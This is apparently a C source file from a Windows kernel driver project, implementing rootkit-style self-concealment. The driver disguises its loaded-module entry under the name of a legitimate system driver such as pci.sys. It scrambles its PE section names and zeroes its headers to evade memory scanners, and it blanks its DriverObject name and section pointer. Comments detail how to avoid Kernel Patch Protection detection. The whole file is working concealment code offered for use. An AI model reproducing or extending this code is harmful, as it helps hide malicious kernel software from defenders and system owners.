/* stealth.c -- module self-concealment.
 *
 * Phase 1.4: do NOT unlink from PsLoadedModuleList.
 * -------------------------------------------------
 * Kernel drivers are threaded on ONE list head (PsLoadedModuleList, chained
 * through KLDR_DATA_TABLE_ENTRY::InLoadOrderLinks). Earlier builds also
 * carried InMemoryOrderLinks and InInitializationOrderLinks on some module
 * objects, but PsLoadedModuleList itself walks only InLoadOrderLinks. An
 * unlink of any of those three on a build that tracks them structurally
 * (Win10 1703+, Win11 on Zen 4) is detected by Kernel Patch Protection and
 * bugchecks 0x109 (CRITICAL_STRUCTURE_CORRUPTION) within tens of minutes.
 *
 * Replacement scheme: locate our own KLDR_DATA_TABLE_ENTRY by name match,
 * locate a benign in-tree module (we use pci.sys -- always loaded on any
 * Windows kernel with PCI buses present, i.e. every supported configuration
 * on a 7700X) to serve as a donor, then overwrite our BaseDllName AND
 * FullDllName UNICODE_STRINGs with the donor's.
 *
 * Pool-scanner evasion (after the rename): walk our own PE section headers
 * through IMAGE_FIRST_SECTION and overwrite each 8-byte section name with
 * random alphabetic bytes, then zero the DOS+PE header prefix. ORDER
 * MATTERS: the section-name walk needs a valid e_lfanew, so section
 * scramble runs BEFORE RtlZeroMemory(our_base, 0x400). PG caveat: third-
 * party driver images are typically not individually hash-tracked, but a
 * disposable VM pass is called for before shipping -- if our image lands
 * in PG's hash set for a given build, modifying its mapped bytes trips a
 * 0x109 the same way a PsLoadedModuleList unlink would.
 *
 * Overwrite-all-fields rationale. The NT loader builds each
 * KLDR_DATA_TABLE_ENTRY's UNICODE_STRING{.Buffer, .Length, .MaximumLength}
 * atomically; any partial swap (e.g. overwriting Buffer while leaving
 * Length/MaximumLength from the old string) leaves a mismatch that:
 *   - trips the internal RtlEqualUnicodeString check used by the loader,
 *   - makes NtQuerySystemInformation(SystemModuleInformation) read past
 *     the end of the new Buffer or truncate it short, which is a stronger
 *     detection signal than the original unsanitized name,
 *   - may trigger PG header-integrity checks because Length no longer
 *     matches wcslen(Buffer) * 2.
 * So the write copies all three fields together.
 *
 * FullDllName in particular. NtQuerySystemInformation(SystemModuleInformation)
 * returns an ANSI FullPathName[256] built from FullDllName, not BaseDllName.
 * If we rename only BaseDllName, every NtQSI caller still sees the original
 * FullPathName that embeds the unredacted filename and FileName offset. So
 * both fields must move together.
 *
 * Revert on unload restores the original UNICODE_STRINGs so the loader's
 * unload path sees the correct names.
 */

#include "the_chamber.h"
#include "stealth.h"

typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG      Flags;
    USHORT     LoadCount;
    USHORT     TlsIndex;
    LIST_ENTRY HashLinks;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

extern LIST_ENTRY PsLoadedModuleList;

/* Phase 1.4 saved state for revert. */
static PKLDR_DATA_TABLE_ENTRY g_saved_entry        = NULL;
static UNICODE_STRING         g_saved_base_dll_name = { 0, 0, NULL };
static UNICODE_STRING         g_saved_full_dll_name = { 0, 0, NULL };
static UNICODE_STRING         g_saved_driver_name   = { 0, 0, NULL };
static PVOID                  g_saved_driver_section = NULL;
/* Set only after both the KLDR rename AND the DriverObject field saves
 * have succeeded.  stealth_revert refuses to restore DriverObject
 * fields unless this is TRUE so an early-returning apply does not
 * blit zero-initialized statics over drv->DriverName/DriverSection. */
static BOOLEAN                g_stealth_driver_saved = FALSE;

/* Case-insensitive wide comparison of e->BaseDllName against `want`.
 * `want` must be a zero-terminated WCHAR array; its terminator is not
 * counted. */
static BOOLEAN name_matches(PKLDR_DATA_TABLE_ENTRY e, const WCHAR *want) {
    USHORT want_n = 0;
    USHORT have_n;
    PWCH   p;
    SIZE_T j;

    if (!e || !want) return FALSE;
    have_n = e->BaseDllName.Length / sizeof(WCHAR);
    p = e->BaseDllName.Buffer;
    if (!p) return FALSE;

    while (want[want_n]) want_n++;
    if (have_n != want_n) return FALSE;

    for (j = 0; j < want_n; j++) {
        WCHAR a = p[j];
        WCHAR b = want[j];
        if (a >= L'A' && a <= L'Z') a = (WCHAR)(a - L'A' + L'a');
        if (b >= L'A' && b <= L'Z') b = (WCHAR)(b - L'A' + L'a');
        if (a != b) return FALSE;
    }
    return TRUE;
}

/* Phase 1.7: match our own KLDR entry by DllBase against the DriverObject's
 * DriverStart. The loader populates both to the same address (the image
 * load base) when it maps us, so this match is independent of whatever
 * filename the launcher chose at install time. Avoiding a hardcoded
 * WCHAR alias table also keeps every per-install branded filename out of
 * the release binary. */
static BOOLEAN is_our_module(PKLDR_DATA_TABLE_ENTRY e, PDRIVER_OBJECT drv) {
    if (!e || !drv) return FALSE;
    return (e->DllBase == drv->DriverStart);
}

/* Donor pool for cover-module rename. The seed picks one preferred
 * index via cfg.rename_donor_index; stealth_apply tries that donor
 * first and falls back to the remaining pool in order if the preferred
 * module is not loaded (minimal WinPE images strip some of them).
 * Every entry is a legitimate OS component name — no branded identifier
 * leaks through. The pool is intentionally diverse so a reseed shifts
 * which legit driver name the KLDR entry wears. */
static const WCHAR *const DONOR_POOL[] = {
    L"pci.sys",
    L"acpi.sys",
    L"msrpc.sys",
    L"storport.sys",
    L"tcpip.sys",
    L"ndis.sys",
    L"disk.sys",
    L"partmgr.sys"
};
#define DONOR_POOL_COUNT (sizeof(DONOR_POOL)/sizeof(DONOR_POOL[0]))

static BOOLEAN is_donor_module(PKLDR_DATA_TABLE_ENTRY e) {
    SIZE_T i;
    for (i = 0; i < DONOR_POOL_COUNT; i++) {
        if (name_matches(e, DONOR_POOL[i])) return TRUE;
    }
    return FALSE;
}

/* Preferred donor name for this seed; NULL falls back to is_donor_module
 * matching any pool entry in load order. */
static const WCHAR *preferred_donor_name(void) {
    if (!g_chamber_cfg_v2_valid) return NULL;
    SIZE_T idx = (SIZE_T)g_chamber_cfg_v2.rename_donor_index % DONOR_POOL_COUNT;
    return DONOR_POOL[idx];
}

/* Pool-scanner evasion. Called AFTER stealth_apply's rename-in-place. The
 * rename hides us from NtQuerySystemInformation(SystemModuleInformation)
 * but leaves PE magic bytes and canonical section names (.text, INIT,
 * PAGE) in physical memory where a pool/physmem scanner can grep for
 * them. Scrambling the section headers kills the .text/INIT/PAGE string
 * signature; zeroing the DOS+PE header kills the MZ/PE\0\0 magic
 * signature. The section-name walk MUST run before the header zero
 * because IMAGE_FIRST_SECTION dereferences e_lfanew. */
static void scramble_section_names(PVOID image_base) {
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;
    LARGE_INTEGER tc;
    ULONG seed;
    USHORT n, i;
    int j;

    if (!image_base) return;

    dos = (PIMAGE_DOS_HEADER)image_base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    nt = (PIMAGE_NT_HEADERS)((PUCHAR)image_base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    /* KeQueryTickCount writes 8 bytes through its pointer argument on
     * modern WDK (ReadInterruptTickCount into a LARGE_INTEGER). Passing
     * the address of a 4-byte ULONG would corrupt the stack; use a
     * proper LARGE_INTEGER buffer and feed its LowPart into RtlRandomEx. */
    KeQueryTickCount(&tc);
    seed = tc.LowPart ^ (ULONG)(ULONG_PTR)image_base;

    n = nt->FileHeader.NumberOfSections;
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < n; i++) {
        for (j = 0; j < IMAGE_SIZEOF_SHORT_NAME; j++) {
            /* 52 values per byte (A-Z + a-z); keyspace 52^8 ~= 5.3e13 per name,
             * better than 26^8 ~= 2.1e11. The prior RtlZeroMemory was dead:
             * this loop overwrites every byte unconditionally. */
            ULONG v = RtlRandomEx(&seed) % 52U;
            sec[i].Name[j] = (UCHAR)((v < 26U) ? ('A' + v) : ('a' + (v - 26U)));
        }
    }
}

/* Zero the DOS + PE header prefix (0x400 bytes covers the full DOS
 * header, e_lfanew, NT headers, and section headers area). After this
 * the MZ / PE\0\0 magic is gone. Must run AFTER scramble_section_names
 * because IMAGE_FIRST_SECTION reads e_lfanew which this zero clobbers. */
static void zero_pe_header(PVOID image_base) {
    if (!image_base) return;
    RtlZeroMemory(image_base, 0x400);
}

NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
    PLIST_ENTRY head, cur;
    KIRQL irql;
    PKLDR_DATA_TABLE_ENTRY our_entry = NULL;
    PKLDR_DATA_TABLE_ENTRY donor = NULL;
    PVOID our_base = NULL;

    /* Phase 1.5: g_stealth_lock is initialized ONCE in DriverEntry. The
     * previous `static KSPIN_LOCK dummy; KeInitializeSpinLock(&dummy)`
     * pattern inside each entry reset the lock on every call, so a
     * concurrent walker could witness an incompletely-renamed KLDR
     * entry mid-operation. Acquire without re-init.
     *
     * Optional hardening (NOT implemented here): resolve the unexported
     * PsLoadedModuleResource (ERESOURCE) by pattern-scanning ntoskrnl,
     * raise to APC_LEVEL via KeEnterCriticalRegion, acquire the resource
     * exclusive with ExAcquireResourceExclusiveLite(..., TRUE), then
     * raise to DISPATCH_LEVEL for this spin lock. The reverse unwind on
     * release. That gives the strongest guarantee against the loader's
     * own walk, at the cost of pattern-scanning a kernel internal that
     * drifts build-to-build. The current spin-lock-only path is enough
     * for in-tree walkers (NtQuerySystemInformation) and we accept a
     * narrow race window against a bespoke loader-internal walker. */
    KeAcquireSpinLock(&g_stealth_lock, &irql);

    head = &PsLoadedModuleList;

    /* First pass: find our own KLDR_DATA_TABLE_ENTRY by DllBase match. */
    for (cur = head->Flink; cur != head; cur = cur->Flink) {
        PKLDR_DATA_TABLE_ENTRY e =
            CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (is_our_module(e, drv)) {
            our_entry = e;
            break;
        }
    }
    if (!our_entry) {
        KeReleaseSpinLock(&g_stealth_lock, irql);
        return STATUS_NOT_FOUND;
    }

    /* Second pass: find a donor module whose BaseDllName/FullDllName we
     * can clone. The seed selects one preferred name via
     * cfg.rename_donor_index; try that donor first, then fall back to
     * any pool member in load order if the preferred module is not
     * resident. Skip ourselves. */
    {
        const WCHAR *preferred = preferred_donor_name();
        if (preferred) {
            for (cur = head->Flink; cur != head; cur = cur->Flink) {
                PKLDR_DATA_TABLE_ENTRY e =
                    CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY,
                                      InLoadOrderLinks);
                if (e == our_entry) continue;
                if (name_matches(e, preferred)) { donor = e; break; }
            }
        }
    }
    if (!donor) {
        for (cur = head->Flink; cur != head; cur = cur->Flink) {
            PKLDR_DATA_TABLE_ENTRY e =
                CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
            if (e == our_entry) continue;
            if (is_donor_module(e)) {
                donor = e;
                break;
            }
        }
    }
    if (!donor) {
        KeReleaseSpinLock(&g_stealth_lock, irql);
        return STATUS_NOT_FOUND;
    }

    /* Save originals, then overwrite BOTH UNICODE_STRINGs completely
     * (Buffer + Length + MaximumLength together). A partial swap is a
     * stronger tell than the original branded name (see file header). */
    g_saved_entry        = our_entry;
    g_saved_base_dll_name = our_entry->BaseDllName;
    g_saved_full_dll_name = our_entry->FullDllName;

    our_entry->BaseDllName = donor->BaseDllName;
    our_entry->FullDllName = donor->FullDllName;

    /* Capture our DllBase under the lock while the KLDR entry is still
     * authoritative, for the pool-scanner-evasion pass below. */
    our_base = our_entry->DllBase;

    KeReleaseSpinLock(&g_stealth_lock, irql);

    /* Pool-scanner evasion. Order: section-name scramble first (walk
     * e_lfanew to the section headers), THEN zero the DOS+PE header
     * prefix (0x400 bytes). Reversing the two would clobber e_lfanew and
     * leave the section-header walk reading wild memory. Done after the
     * rename pass and outside g_stealth_lock because these writes target
     * our OWN image, not the shared PsLoadedModuleList. */
    if (our_base) {
        scramble_section_names(our_base);
        zero_pe_header(our_base);
    }

    /* DriverObject fields.
     *
     * BIG CAVEAT: nulling DriverSection breaks the driver-unload path.
     * IoUnloadDriver() and MmUnloadSystemImage() read DriverSection to
     * locate the KLDR entry for free. Setting it to NULL leaves that
     * code with a dangling reference and the unload becomes undefined.
     * This is only safe when the driver is designed NEVER to unload --
     * the watchdog/shutdown IOCTL path in this project calls
     * stealth_revert() first (see UnloadRoutine in the_chamber.c), which
     * restores the pointer before the loader needs it.
     *
     * Nulling DriverSection ALSO breaks any DriverObject->DriverSection->
     * DllBase self-base lookup. Note: it does NOT break
     * MmGetSystemRoutineAddress (that walks PsLoadedModuleList directly
     * via the ntoskrnl entry, not through any driver's DriverSection)
     * and does NOT break RtlPcToFileHeader (that walks the loader data
     * table through PsLoadedModuleList). Impact on minifilter driver
     * registration (FltRegisterFilter -> FilterManager internal state)
     * is UNVERIFIED; this driver is not a minifilter, so no concern here.
     *
     * DriverName cleared similarly, as before. The revert path restores
     * both fields. */
    if (drv) {
        g_saved_driver_name    = drv->DriverName;
        g_saved_driver_section = drv->DriverSection;
        g_stealth_driver_saved = TRUE;
        drv->DriverName.Length         = 0;
        drv->DriverName.MaximumLength  = 0;
        drv->DriverName.Buffer         = NULL;
        drv->DriverSection             = NULL;
    }

    CHAMBER_LOG("stealth applied (renamed; donor %wZ)\n", &donor->BaseDllName);
    return STATUS_SUCCESS;
}

NTSTATUS stealth_revert(PDRIVER_OBJECT drv) {
    KIRQL irql;
    BOOLEAN restore_driver;

    /* Phase 1.5: use the shared g_stealth_lock, no re-init. */
    KeAcquireSpinLock(&g_stealth_lock, &irql);
    if (g_saved_entry) {
        /* Restore original BaseDllName / FullDllName in full. */
        g_saved_entry->BaseDllName = g_saved_base_dll_name;
        g_saved_entry->FullDllName = g_saved_full_dll_name;
        g_saved_entry = NULL;
    }
    restore_driver = g_stealth_driver_saved;
    g_stealth_driver_saved = FALSE;
    KeReleaseSpinLock(&g_stealth_lock, irql);

    /* Only restore DriverObject fields if stealth_apply ran to
     * completion (and actually saved them).  An early-returning apply
     * leaves the save statics zeroed; blindly restoring from them
     * would write NULL DriverSection and MmUnloadSystemImage would
     * deref it. */
    if (drv && restore_driver) {
        drv->DriverName    = g_saved_driver_name;
        drv->DriverSection = g_saved_driver_section;
    }

    /* We intentionally do NOT un-scramble section names or restore the
     * DOS+PE header. The driver is unloading in a few moments; the
     * loader does not re-parse our section names during unload (it uses
     * DriverSection which we restore above), and the image's memory
     * pages are released to the pool/MmUnloadSystemImage path immediately
     * after. Attempting to reconstruct the header would require stashing
     * a 0x400-byte copy for the lifetime of the driver -- more pool
     * footprint for no behavioral win. */
    CHAMBER_LOG("stealth reverted (section-name scramble / PE zero not "
                "restored; image is being unloaded)\n");
    return STATUS_SUCCESS;
}
